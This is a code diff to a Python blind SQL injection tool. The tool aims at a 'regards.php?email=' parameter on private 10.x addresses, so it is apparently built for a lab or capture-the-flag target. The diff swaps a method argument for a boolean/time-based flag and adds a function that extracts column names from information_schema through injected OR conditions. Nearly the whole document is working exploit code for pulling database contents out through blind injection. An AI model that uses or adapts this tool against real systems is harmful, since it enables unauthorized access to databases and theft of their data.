@@ -9,14 +9,14 @@ from argparse import ArgumentParser
 
 class Blind():
 	def __init__(self, url='http://10.102.10.42/regards.php?email=',
-				 delay=0.1, method='time', indicator=None):
+				 delay=0.1, boolean=False, indicator=None):
 		self.url = url
 		self.delay = delay
-		self.method = method
-		if method == 'time':
-			self.make_payload = self.make_time_payload
-		else:
+		self.boolean = boolean
+		if self.boolean:
 			self.make_payload = self.make_bool_payload
+		else:
+			self.make_payload = self.make_time_payload
 		self.indicator = indicator
 
 	def send(self, payload, method='GET'):
@@ -40,18 +40,18 @@ class Blind():
 		query = "' OR " + cond + " AND 'a'='a"
 		return query
 
-	def validate(self, method='time', start=None, end=None,
-				 response=None):
-		if method == 'time':
-			if end - start >= self.delay:
-				return True
-			else:
-				return False
-		else:
+	def validate(self, start=None, end=None, response=None):
+		if self.boolean:
 			if self.indicator in response.text:
 				return True
 			else:
 				return False
+		else:
+			if end - start >= self.delay:
+				return True
+			else:
+				return False
+
 
 	def get_length(self, item):
 		condition = 'LENGTH(' + item + ')={}'
@@ -96,7 +96,20 @@ class Blind():
 		if not db:
 			db = self.get_db()
 		cond = "(SELECT table_name FROM information_schema.tables "
-		cond += "WHERE table_schema='{}'".format(db)
+		cond += "WHERE table_schema='{}')".format(db)
+		return self.get_string(cond)
+
+	def get_columns(self, table, db):
+		if not db:
+			db = self.get_db()
+		if not table:
+			table = self.get_table(db)
+
+		cond = "(SELECT GROUP_CONCAT(column_name) FROM information_"
+		cond += "schema.columns WHERE table_schema='{}' AND "
+		cond += "table_name='{}')"
+		cond = cond.format(db, table)
+
 		return self.get_string(cond)
 
 
@@ -107,10 +120,10 @@ def get_args():
 	parser.add_argument('-s', '--string', help='Get the string')
 	parser.add_argument('-d', '--delay', default=0.1, type=float,
 						help='Delay for time-based blind')
-	parser.add_argument('-m', '--method', default='time',
-						help='type of blind')
+	parser.add_argument('-b', '--bool', action='store_true',
+						help='Use bool-based blind instead of time-based')
 	parser.add_argument('-i', '--indicator', default='correctly set',
-						help='Indicator for bool')
+						help='Indicator for bool-based blind')
 	parser.add_argument('-u', '--url',  help='Target URL',
 						default='http://10.102.8.197/regards.php?email=')
 
@@ -119,7 +132,7 @@ def get_args():
 
 if __name__ == '__main__':
 	args = get_args()
-	b = Blind(url=args.url, delay=args.delay, method=args.method)
+	b = Blind(url=args.url, delay=args.delay, boolean=args.bool)
 
 	if args.indicator:
 		b.indicator = args.indicator
